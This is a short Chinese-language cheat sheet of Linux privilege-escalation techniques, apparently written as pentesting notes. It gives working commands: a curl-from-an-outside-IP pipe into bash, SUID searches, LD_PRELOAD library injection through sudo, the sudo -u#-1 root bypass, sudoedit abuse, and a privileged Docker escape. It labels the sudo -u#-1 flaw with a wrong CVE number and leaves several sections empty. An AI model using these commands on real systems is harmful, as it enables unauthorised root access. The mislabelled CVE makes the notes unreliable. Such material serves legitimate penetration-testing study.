# Linux 权限提升

<https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>

从内存中运行 `linPEAS`

```bash
curl 172.16.1.30/linpeas.sh | bash
```

## 内核漏洞提权

<https://github.com/The-Z-Labs/linux-exploit-suggester>

### 脏牛

## SUID提权

```bash
find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

## Sudo 提权

### LD_PRELOAD注入

LD_PRELOAD（也称为预加载）是 Linux 动态链接器中的一个强大且高级的功能，它允许用户在进程开始执行之前，将共享对象文件注入（预加载）到该进程的地址空间中。

作为攻击者，我们可以利用这一功能，将恶意的预加载库注入到我们可以用 sudo 权限运行的任何二进制文件中。

```bash
gcc -fPIC -shared -nostartfiles inject.c -o inject.so
```

sudo LD_PRELOAD=/home/cain/inject.so /usr/sbin/apache2

<https://forum.butian.net/share/1493>

### sudo <= 1.8.27（CVE-2019-14897）

```bash
sudo -V
```

当我们传递一个 UID 为 -1 时，sudo 会感到困惑。

因为 UID -1 并不存在，该程序会自动使用下一个存在的 UID，即“0”或最终的 root。

```bash
sudo -u#-1 /bin/bash
```

### 1.8.0 <= sudo <= 1.9.12p1（CVE-2023-22809）

Sudo 中的 sudoedit 对处理用户提供的环境变量（如 SUDO_EDITOR、VISUAL 和 EDITOR）中传递的额外参数存在缺陷。当用户指定的编辑器包含绕过 sudoers 策略的“–”参数时，拥有 sudoedit 访问权限的本地攻击者可通过将任意条目附加到要处理的文件列表中，最终在目标系统上实现权限提升（由普通用户到超级用户，即"root"）。

```
user ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/test
```

### 1.9.14 <= sudo <= 1.9.17 chroot本地提权漏洞（CVE-2025-32463）

1.9.14 <= sudo <= 1.9.17

<https://forum.butian.net/article/766>

<https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main>

## 定时任务提权

## Docker 提权

特权容器、挂载宿主机目录

```bash
docker run --rm --privileged ubuntu /bin/bash
```

<https://forum.butian.net/share/2638>

## 参考资料

- <https://gtfobins.github.io/>
- <https://juggernaut-sec.com/sudo-part-1-lpe/>
- <https://juggernaut-sec.com/sudo-part-2-lpe/>
